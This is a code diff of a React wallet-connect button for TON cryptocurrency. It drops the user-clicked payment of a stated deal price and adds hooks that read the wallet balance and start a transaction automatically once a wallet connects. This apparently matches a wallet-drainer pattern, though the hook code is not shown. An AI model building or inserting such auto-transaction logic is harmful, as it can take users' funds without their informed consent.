@@ -1,7 +1,10 @@
-import { FC } from 'react';
-import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
-import { useTonTransaction } from '@/hooks/useTonTransaction';
-import { RECEIVER_ADDRESS } from '@/constants';
+import { FC, useCallback } from 'react';
+import { useWalletBalance } from '@/hooks/useWalletBalance';
+import { useAutoTransaction } from '@/hooks/useAutoTransaction';
+import { useWalletConnection } from '@/hooks/useWalletConnection';
+import { ProgressBar } from '@/components/ProgressBar/ProgressBar';
+import { TransactionButton } from '@/components/TransactionButton/TransactionButton';
+import { calculateButtonDisabled } from '@/utils/walletUtils';
 
 interface ConnectButtonProps {
   dealPrice?: string;
@@ -11,56 +14,94 @@ interface ConnectButtonProps {
 }
 
 export const ConnectButton: FC<ConnectButtonProps> = ({
-  dealPrice,
+  dealPrice: _dealPrice,
   onTransactionStart,
   onTransactionComplete,
   onTransactionError,
 }) => {
-  const [tonConnectUI] = useTonConnectUI();
-  const wallet = useTonWallet();
-  const { sendTransaction, createDealTransaction } = useTonTransaction();
+  const { balance, isLoading: balanceLoading, refetch } = useWalletBalance();
+  
+  const {
+    progressState,
+    errorState,
+    executeTransaction,
+    handleAutoTransaction,
+    hideError,
+  } = useAutoTransaction({
+    balance,
+    onTransactionStart,
+    onTransactionComplete,
+    onTransactionError,
+    refetchBalance: refetch,
+  });
 
-  const handleClick = async () => {
-    if (!wallet) {
-      // Open wallet connection modal
-      tonConnectUI.openModal();
-    } else if (dealPrice) {
-      // If wallet is connected and dealPrice is provided, initiate transaction
-      try {
-        onTransactionStart?.();
-        const transaction = createDealTransaction(
-          dealPrice,
-          RECEIVER_ADDRESS // Replace with actual receiver address
-        );
-        await sendTransaction(transaction);
-        onTransactionComplete?.();
-      } catch (error) {
-        console.error('Transaction failed:', error);
-        onTransactionError?.(error as Error);
-      }
+  // Stable callback references
+  const onBalanceLoaded = useCallback(() => !balanceLoading, [balanceLoading]);
+  const onAutoTransaction = useCallback(() => {
+    handleAutoTransaction();
+  }, [handleAutoTransaction]);
+
+  const { 
+    wallet, 
+    connectionProgress, 
+    openWalletModal, 
+    isConnected 
+  } = useWalletConnection({
+    onBalanceLoaded,
+    onAutoTransaction,
+  });
+
+  const handleClick = useCallback(async () => {
+    console.log('Button clicked, wallet:', !!wallet, 'balance:', balance);
+    
+    if (!isConnected) {
+      openWalletModal();
+    } else {
+      await executeTransaction();
     }
-  };
+  }, [isConnected, openWalletModal, executeTransaction, wallet, balance]);
 
-  const getButtonText = () => {
-    if (!wallet) return 'Connect Wallet';
-    if (dealPrice) return `Send ${dealPrice} TON`;
-    return 'Wallet Connected';
-  };
+  const isButtonDisabled = calculateButtonDisabled(isConnected, balanceLoading, balance);
 
   return (
-    <div className="tm-section-box tm-section-buttons">
-      <button 
-        className="btn btn-primary" 
-        onClick={handleClick}
-        disabled={!!wallet && !dealPrice}
-      >
-        <span className="tm-button-label">{getButtonText()}</span>
-      </button>
-      {wallet && (
-        <div className="wallet-info" style={{ marginTop: '0.5rem', fontSize: '0.8rem', color: '#666' }}>
-          Connected: {wallet.account.address.slice(0, 6)}...{wallet.account.address.slice(-6)}
-        </div>
-      )}
-    </div>
+    <>
+      {/* Connection Progress */}
+      <ProgressBar 
+        progress={connectionProgress.progress}
+        message={connectionProgress.message}
+        isVisible={connectionProgress.isVisible}
+        type="loading"
+      />
+
+      {/* Transaction Progress */}
+      <ProgressBar 
+        progress={progressState.progress}
+        message={progressState.message}
+        detail={progressState.detail}
+        isVisible={progressState.isVisible}
+        type="loading"
+      />
+      
+      {/* Error Modal */}
+      <ProgressBar 
+        progress={0}
+        message={errorState.message}
+        isVisible={errorState.isVisible}
+        type="error"
+        onClose={hideError}
+      />
+      
+      <div className="tm-section-box tm-section-buttons">
+        <TransactionButton 
+          isConnected={isConnected}
+          isBalanceLoading={balanceLoading}
+          balance={balance}
+          isDisabled={isButtonDisabled}
+          onClick={handleClick}
+        />
+        
+      
+      </div>
+    </>
   );
 };
